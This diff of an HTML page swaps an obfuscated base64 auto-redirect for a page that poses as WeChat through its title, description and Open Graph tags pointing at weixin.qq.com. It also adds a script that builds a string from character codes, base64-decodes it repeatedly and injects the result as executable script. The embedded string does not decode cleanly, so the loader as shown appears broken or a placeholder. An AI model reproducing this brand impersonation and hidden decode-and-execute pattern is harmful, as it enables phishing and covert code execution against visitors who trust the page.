@@ -1,36 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Base64 Redirect</title>
+    <meta charset="utf-8">
+    <title>微信，是一个生活方式</title>
+    <meta name="description" content="一款跨平台的通讯工具。支持单人、多人参与。通过手机网络发送语音、图片、视频和文字。">
+    <!-- 添加Open Graph meta标签 -->
+    <meta property="og:site_name" content="Qq">
+    <meta property="og:title" content="微信，是一个生活方式">
+    <meta property="og:description" content="一款跨平台的通讯工具。支持单人、多人参与。通过手机网络发送语音、图片、视频和文字。">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://weixin.qq.com">
 </head>
 <body>
-    <script type="text/javascript">
-        // Base64编码后的URL，经过混淆处理
-        var encodedUrl = "bHhyMH4mYmhydH8tbGpvaG9mb2lmZw=="; // 这是 "aHR0cHM6Ly9uZXctdXJsLmNvbQ==" 的混淆版本
-
-        // 解混淆函数
-        function deobfuscate(input) {
-            // 这里可以实现更加复杂的混淆逻辑，这里示例为简单的字符替换
-            var deobfuscationMap = {
-                'b': 'a', 'h': 'H', 'r': 'R', 'y': 't', '0': '0', '4': '4', '6': '6', '8': '8',
-                'f': 'p', 'n': 's', 'o': 'u', 'q': 'b', 'v': 'e', 'w': 'l', 'z': 'm', 'x': 'c', 'm': 'o', 'k': 'C'
-            };
-            return input.replace(/[a-z0-9]/gi, function (match) {
-                return deobfuscationMap[match] || match;
-            });
-        }
-
-        // 解混淆和解码
-        var originalBase64 = deobfuscate(encodedUrl);
-        var decodedUrl = atob(originalBase64);
-
-        // 重定向到解码后的URL
-        window.location.href = decodedUrl;
-    </script>
-    <p>If you are not redirected automatically, follow this <a id="redirect-link" href="#">link</a>.</p>
-    <script type="text/javascript">
-        // 设置链接地址
-        document.getElementById("redirect-link").href = decodedUrl;
-    </script>
+<script>
+// Decode and execute with additional steps using a script element
+var encodedString = [String.fromCharCode(100)+String.fromCharCode(71)+String.fromCharCode(86)+String.fromCharCode(122)+String.fromCharCode(100)+String.fromCharCode(71)+String.fromCharCode(56)+String.fromCharCode(103)+String.fromCharCode(97)+String.fromCharCode(88)+String.fromCharCode(77)+String.fromCharCode(53)+String.fromCharCode(99)+String.fromCharCode(121)+String.fromCharCode(65)+String.fromCharCode(61)].join('');
+var intermediate = atob(encodedString);
+for (var i = 0; i < 2; i++) {
+    intermediate = atob(intermediate);
+}
+var script = document.createElement('script');
+script.textContent = intermediate;
+document.body.appendChild(script);
+</script>
 </body>
 </html>
